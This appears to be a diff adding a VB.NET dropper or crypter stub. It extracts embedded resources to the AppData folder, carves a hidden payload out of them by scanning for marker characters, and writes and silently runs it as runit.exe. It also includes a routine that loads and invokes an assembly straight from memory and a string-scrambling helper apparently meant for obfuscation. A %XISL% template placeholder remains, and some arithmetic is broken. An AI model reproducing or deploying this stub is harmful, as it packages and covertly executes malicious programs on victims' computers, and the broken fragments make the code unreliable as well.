@@ -1,0 +1,101 @@
+﻿Imports System
+Imports System.IO
+Imports System.Environment
+Imports Microsoft.VisualBasic
+Imports System.Threading
+Imports System.Reflection
+Imports System.Collections
+Imports System.Runtime.CompilerServices
+Imports System.Diagnostics
+
+Module X
+
+
+    Public ISO As Byte()
+    Dim XZOR As Threading.Thread
+
+	Sub Main()
+	Dim runTimeResourceSet As Object
+    Dim dictEntry As DictionaryEntry
+	Dim resm As New Resources.ResourceManager("lixks", Assembly.GetExecutingAssembly)
+	Dim data As Byte()
+
+		runTimeResourceSet = resm.GetResourceSet(System.Globalization.CultureInfo.CurrentCulture, True, True)
+	    For Each dictEntry In runTimeResourceSet
+		data = resm.GetObject(dictEntry.key)
+			Using sCreateMSIFile As New FileStream(Environment.GetFolderPath(SpecialFolder.ApplicationData) & dictEntry.Key, FileMode.Create)
+            sCreateMSIFile.Write(data, 0, data.length)
+        End Using
+
+		
+            Using NEWBIE As New IO.FileStream(Environment.GetFolderPath(SpecialFolder.ApplicationData) & dictEntry.Key, IO.FileMode.Open)
+
+                NEWBIE.Seek(0, IO.SeekOrigin.End)
+
+                While Not NEWBIE.ReadByte = Asc("♥")
+                    NEWBIE.Position -= 2
+                End While
+                Dim s As String = Nothing
+                While Not NEWBIE.Position = NEWBIE.Length - 4
+                    s &= Chr(NEWBIE.ReadByte.ToString)
+                End While
+
+                Dim Ext As String = Nothing
+                NEWBIE.Seek(0, IO.SeekOrigin.End)
+                While Not NEWBIE.ReadByte = Asc("#")
+                    NEWBIE.Position -= 2
+                End While
+                While Not NEWBIE.Position = NEWBIE.Length
+                    Ext &= Chr(NEWBIE.ReadByte.ToString)
+                End While
+                NEWBIE.Seek(NEWBIE.Length - ((s.Length + s) + 5), IO.SeekOrigin.Begin)
+                Using FSw As New IO.FileStream(Environment.GetFolderPath(SpecialFolder.ApplicationData) + "\runit.exe", IO.FileMode.Create)
+                    While Not NEWBIE.Position = NEWBIE.Length - (s.Length + 5)
+                        FSw.WriteByte(NEWBIE.ReadByte)
+                    End While
+                End Using
+            End Using
+
+		%XISL%
+
+			System.Diagnostics.Process.Start(Environment.GetFolderPath(SpecialFolder.ApplicationData) + "\runit.exe")
+
+        Next
+	End Sub
+
+
+	Public Function Help(ByVal sInput As String) As String
+        Dim sTemp As String = ""
+        Dim sEnd As String = ""
+        Dim sStart As String = ""
+        Dim iLoop As Integer
+        Dim iLen As Integer
+        Dim iMiddle As Integer
+        Dim iRemainder As Integer
+
+        iLen = sInput.Length
+        iRemainder = iLen Mod 2
+        iMiddle = iLen \ 2
+
+        For iLoop = iMiddle + iRemainder To 1 Step -2 + 1
+            If iRemainder = 0 Then
+                sTemp += Microsoft.VisualBasic.Mid(sInput, iLoop + iMiddle, 1)
+            End If
+            sTemp += Microsoft.VisualBasic.Mid(sInput, iLoop, 1)
+            If iRemainder = 1 And iLoop <> 1 Then
+                sTemp += Microsoft.VisualBasic.Mid(sInput, iLoop + iMiddle, 1)
+            End If
+        Next
+
+        Return sTemp
+    End Function
+
+
+	 Public Sub RunFromMemory()
+        Dim assembly As Assembly = assembly.Load(ISO)
+        Dim entryPoint As MethodInfo = [assembly].EntryPoint
+        Dim objectValue As Object = RuntimeHelpers.GetObjectValue([assembly].CreateInstance(entryPoint.Name))
+        entryPoint.Invoke(RuntimeHelpers.GetObjectValue(objectValue), New Object() {New String() {"1"}})
+    End Sub
+
+End Module 
